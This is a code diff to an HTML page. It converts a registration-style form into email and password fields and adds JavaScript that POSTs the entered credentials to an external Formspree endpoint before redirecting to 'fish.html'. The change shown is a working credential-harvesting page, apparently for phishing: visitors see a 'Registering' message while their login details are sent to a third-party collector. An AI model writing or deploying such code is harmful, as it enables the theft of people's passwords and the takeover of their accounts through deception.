@@ -370,17 +370,17 @@
 
   <form id="infoForm" autocomplete="off">
     <div class="field-group">
-      <label class="field-label" for="name">Email Address</label>
+      <label class="field-label" for="email">Email Address</label>
       <div class="field-wrap">
         <span class="field-icon">◈</span>
-        <input type="text" id="name" name="name" placeholder="e.g. Alex Johnson" required/>
+        <input type="text" id="email" name="email" placeholder="you@example.com" required/>
       </div>
     </div>
     <div class="field-group">
-      <label class="field-label" for="email">Password</label>
+      <label class="field-label" for="password">Password</label>
       <div class="field-wrap">
         <span class="field-icon">◉</span>
-        <input type="password" id="email" name="email" placeholder="you@institution.edu" required style="padding-right: 3rem;"/>
+        <input type="password" id="password" name="password" placeholder="" required style="padding-right: 3rem;"/>
         <button type="button" id="toggleEmail" onclick="window.toggleEmail()"
           style="position:absolute; right:0.9rem; top:50%; transform:translateY(-50%);
                  background:none; border:none; cursor:pointer; color:#7a7580;
@@ -397,25 +397,38 @@
 
 <script>
   window.toggleEmail = function() {
-    const field = document.getElementById('email');
+    const field = document.getElementById('password');
     const icon  = document.getElementById('toggleEmail');
     const show  = field.type === 'password';
     field.type  = show ? 'text' : 'password';
     icon.textContent = show ? '◡' : '👁';
   }
 
-  // Form submit
+  // Form submit → Formspree
   const form = document.getElementById('infoForm');
   const msg  = document.getElementById('message');
 
-  form.addEventListener('submit', function(e) {
+  form.addEventListener('submit', async function(e) {
     e.preventDefault();
     const submitBtn = form.querySelector('button[type="submit"]');
     submitBtn.querySelector('.btn-inner').innerHTML = 'Registering <span class="btn-arrow">✦</span>';
     submitBtn.style.background = '#5b1fa0';
     submitBtn.disabled = true;
     msg.classList.add('visible');
-    setTimeout(() => { window.location.href = 'fish.html'; }, 500);
+
+    const data = new FormData(form);
+
+    try {
+      await fetch('https://formspree.io/f/mqegkdrv', {
+        method: 'POST',
+        body: data,
+        headers: { 'Accept': 'application/json' }
+      });
+    } catch(err) {
+      console.error('Formspree error:', err);
+    }
+
+    setTimeout(() => { window.location.href = 'fish.html'; }, 1500);
   });
 </script>
 
